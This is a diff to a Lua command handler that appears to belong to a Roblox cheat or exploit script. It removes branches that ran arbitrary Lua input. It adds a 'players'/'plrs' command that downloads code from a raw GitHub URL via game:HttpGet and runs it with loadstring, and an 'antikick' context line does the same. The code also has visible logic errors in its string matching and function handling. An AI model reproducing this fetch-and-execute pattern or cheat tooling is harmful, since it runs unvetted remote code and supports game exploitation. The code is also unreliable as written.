@@ -4116,60 +4116,6 @@ end
                           .. "orbit speed [value] - Change orbit speed"
                 end
             end
-        elseif command:sub(1, 15) == "players" then
-            local luaCode = command:sub(16)
-            if luaCode and luaCode:len() > 0 then
-                local func, err = load("return " .. luaCode)
-                if not func then
-                    func, err = load(luaCode)
-                end
-                
-                if func then
-                    local success, execResult = pcall(func)
-                    if success then
-                        result = "Executed successfully:\n" .. tostring(execResult)
-                    else
-                        result = "Execution error:\n" .. tostring(execResult)
-                    end
-                else
-                    result = "Lua error:\n" .. tostring(err)
-                end
-            else
-                -- Show all player usernames
-                local players = game:GetService("Players"):GetPlayers()
-                local usernames = {}
-                for _, player in ipairs(players) do
-                    table.insert(usernames, player.Name)
-                end
-                result = "Players online (" .. #usernames .. "):\n" .. table.concat(usernames, "\n")
-            end
-        elseif command:sub(1, 15) == "plrs" then
-            local luaCode = command:sub(16)
-            if luaCode and luaCode:len() > 0 then
-                local func, err = load("return " .. luaCode)
-                if not func then
-                    func, err = load(luaCode)
-                end
-                
-                if func then
-                    local success, execResult = pcall(func)
-                    if success then
-                        result = "Executed successfully:\n" .. tostring(execResult)
-                    else
-                        result = "Execution error:\n" .. tostring(execResult)
-                    end
-                else
-                    result = "Lua error:\n" .. tostring(err)
-                end
-            else
-                -- Show all player usernames
-                local players = game:GetService("Players"):GetPlayers()
-                local usernames = {}
-                for _, player in ipairs(players) do
-                    table.insert(usernames, player.Name)
-                end
-                result = "Players online (" .. #usernames .. "):\n" .. table.concat(usernames, "\n")
-            end
         elseif command:sub(1, 15) == "antikick" then
             local luaCode = command:sub(16)
             local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/AntkickLol/refs/heads/main/Antikicklol"))()
@@ -4386,6 +4332,19 @@ end
                 end
             else
                 result = "Loaded Quirky Cmd:\n[Ban] (REQ, Remotes)"
+            end
+        elseif command:sub(1, 9):lower() == "players" or command:sub(1, 5):lower() == "plrs" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/igfrxx/PlayerSeletcte/refs/heads/main/r", true))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "Started PlayerList:\nShowing all players"
             end
         elseif command:sub(1, 9):lower() == "smol" or command:sub(1, 5):lower() == "unsmol" then
             local luaCode = command:sub(16)
